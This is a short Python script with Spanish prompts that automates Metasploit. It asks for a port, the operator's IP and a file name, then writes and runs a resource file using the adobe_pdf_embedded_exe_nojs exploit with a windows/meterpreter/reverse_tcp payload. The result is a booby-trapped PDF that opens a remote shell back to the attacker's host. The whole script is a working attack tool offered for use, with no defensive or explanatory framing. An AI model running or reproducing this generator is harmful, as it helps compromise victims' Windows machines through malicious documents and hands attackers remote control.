import os


def clearScr():
    os.system('clear')
       
puerto = input("""

Escoja un puerto {ex: 4444} >  """)

clearScr()
windows_ip = input("""


INTRODUZCA SU IP >  """)

clearScr()

windows_name = input( """


INTRODUZCA EL NOMBRE DEL ARCHIVO {no se olvide de poner .pdf al final del nombre} >

>  """)
clearScr()
print ("""

CREANDO PAYLOAD ...""")



texto4a= "use exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs\n"\
         "set FILENAME "+ windows_name +"\n"\
         "set LHOST "+ windows_ip +"\n"\
         "set PAYLOAD windows/meterpreter/reverse_tcp\n"\
         "set LPORT "+ puerto +"\n"\
         "exploit\n"\
		

with open('windowspdf.rc', 'w') as f:
    f.write(texto4a)
os.system ('msfconsole -r windowspdf.rc')
